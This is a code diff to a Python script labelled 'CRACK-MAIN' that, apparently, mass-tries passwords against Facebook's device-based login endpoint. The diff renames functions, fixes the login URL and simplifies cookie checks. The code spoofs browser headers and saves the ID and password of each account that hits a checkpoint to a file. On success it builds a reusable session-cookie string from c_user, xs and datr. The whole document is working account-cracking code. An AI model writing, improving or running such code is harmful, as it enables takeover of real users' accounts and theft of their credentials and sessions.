@@ -1202,7 +1202,7 @@ def fankygraphv1(idf, pwv, url):
     loop += 1
 
 #-------------------[ CRACK-MAIN ]------------#
-def fanky_b_api(idf,pwv):
+def fanky_b_apiiiubj(idf,pwv):
 	global loop,ok,cp
 	rr = random.randint
 	rc = random.choice
@@ -1248,7 +1248,7 @@ def fanky_b_api(idf,pwv):
 			time.sleep(31)
 	loop+=1
 
-def fanky_b_apiuii(idf, pwv):
+def fanky_b_api(idf, pwv):
     global loop, ok, cp
     rr = random.randint
     rc = random.choice
@@ -1298,9 +1298,9 @@ def fanky_b_apiuii(idf, pwv):
                 "Sec-Fetch-User": "?1",
                 "DNT": "1"
             }
-            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
+            fankyimut = "https://www.facebook.com/login/device-based/regular/login/"
             po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
-            if "checkpoint" in po.cookies.get_dict().keys():
+            if "checkpoint" in po.cookies.get_dict():
                 cp += 1
                 tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                 tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
@@ -1309,7 +1309,7 @@ def fanky_b_apiuii(idf, pwv):
                 prints(tree)
                 open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                 break
-            elif "c_user" in ses.cookies.get_dict().keys():
+            elif "c_user" in ses.cookies.get_dict():
                 ok += 1
                 coki = ses.cookies.get_dict()
                 kuki = ("datr=" + coki["datr"] + ";" + "sb=" + coki["sb"] + ";" + "locale=id_ID" + ";" + "c_user=" + coki["c_user"] + ";" + "xs=" + coki["xs"] + ";" + "fr=" + coki["fr"] + ";")
